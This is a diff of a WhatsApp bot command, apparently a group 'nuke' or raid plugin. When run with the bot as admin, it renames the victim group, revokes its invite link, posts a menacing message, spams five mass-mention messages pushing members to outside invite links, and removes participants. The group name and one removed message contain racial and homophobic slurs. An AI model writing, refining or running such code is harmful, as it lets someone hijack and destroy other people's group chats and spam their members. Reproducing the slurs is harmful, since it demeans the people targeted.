@@ -8,21 +8,19 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
 
     const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
 
-    // 🔹 CAMBIO NOME GRUPPO
     try {
         let metadata = await conn.groupMetadata(m.chat);
         let oldName = metadata.subject;
-        let newName = `𝑺𝑽𝑻 𝑩𝒀 sta minkia`;
+        let newName = `𝑺𝑽𝑻 𝑩𝒀 𝑵𝑰𝑮𝑮𝑨-𝑩𝑶𝑻`;
         await conn.groupUpdateSubject(m.chat, newName);
     } catch (e) {
         console.error('Errore cambio nome gruppo:', e);
     }
 
-    // 🔹 RESET LINK GRUPPO
     let newInviteLink = '';
     try {
-        await conn.groupRevokeInvite(m.chat); // invalida il vecchio link
-        let code = await conn.groupInviteCode(m.chat); // prende il nuovo codice
+        await conn.groupRevokeInvite(m.chat);
+        let code = await conn.groupInviteCode(m.chat);
         newInviteLink = `https://chat.whatsapp.com/${code}`;
     } catch (e) {
         console.error('Errore reset link:', e);
@@ -41,13 +39,17 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     let allJids = participants.map(p => p.jid);
 
     await conn.sendMessage(m.chat, {
-        text: "sanku ricchione"
+        text: "𝑰𝒍 𝒈𝒓𝒖𝒑𝒑𝒐 𝒆̀ 𝒂𝒏𝒄𝒐𝒓𝒂 𝒒𝒖𝒊. 𝑰 𝒎𝒆𝒔𝒔𝒂𝒈𝒈𝒊 𝒔𝒐𝒏𝒐 𝒂𝒏𝒄𝒐𝒓𝒂 𝒍𝒊̀. 𝑴𝒂 𝒒𝒖𝒂𝒍𝒄𝒐𝒔𝒂 𝒆̀ 𝒄𝒂𝒎𝒃𝒊𝒂𝒕𝒐. 𝑵𝒐𝒏 𝒗𝒊 𝒅𝒊𝒓𝒐̀ 𝒄𝒐𝒔𝒂. 𝑳𝒐 𝒄𝒂𝒑𝒊𝒓𝒆𝒕𝒆 𝒒𝒖𝒂𝒏𝒅𝒐 𝒔𝒂𝒓𝒂̀ 𝒊𝒍 𝒎𝒐𝒎𝒆𝒏𝒕𝒐. 𝑷𝒆𝒓 𝒐𝒓𝒂… 𝒂𝒔𝒑𝒆𝒕𝒕𝒂𝒕𝒆 𝒊𝒍 𝒑𝒓𝒐𝒔𝒔𝒊𝒎𝒐 𝒎𝒆𝒔𝒔𝒂𝒈𝒈𝒊𝒐."
     });
 
-    await conn.sendMessage(m.chat, {
-        text: `entrate TUTTI QUI:\n\nhttps://chat.whatsapp.com/FN0vjN5LOeOISFlxI1Oywh?s=cl&p=a&mlu=4\n\nhttps://chat.whatsapp.com/Fh4pGSqj9nMHsj1Rr1Y6qW`,
+    const secondMessage = {
+        text: `𝑬𝒏𝒕𝒓𝒂𝒕𝒆 𝒕𝒖𝒕𝒕𝒊 𝒒𝒖𝒊̀. 𝑰𝒍 𝒓𝒆𝒔𝒕𝒐… 𝒂𝒓𝒓𝒊𝒗𝒆𝒓𝒂̀.:\n\nhttps://chat.whatsapp.com/Gyf7BzAE1rTDomlgW7Qccr\n\nhttps://chat.whatsapp.com/Giwjquiq4k680j9IxNwW2D`,
         mentions: allJids
-    });
+    };
+
+    for (let i = 0; i < 5; i++) {
+        await conn.sendMessage(m.chat, secondMessage);
+    }
 
     try {
         await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
@@ -57,7 +59,7 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     }
 };
 
-handler.command = ['nuke3'];
+handler.command = ['regna'];
 handler.group = true;
 handler.botAdmin = true;
 handler.owner = true;
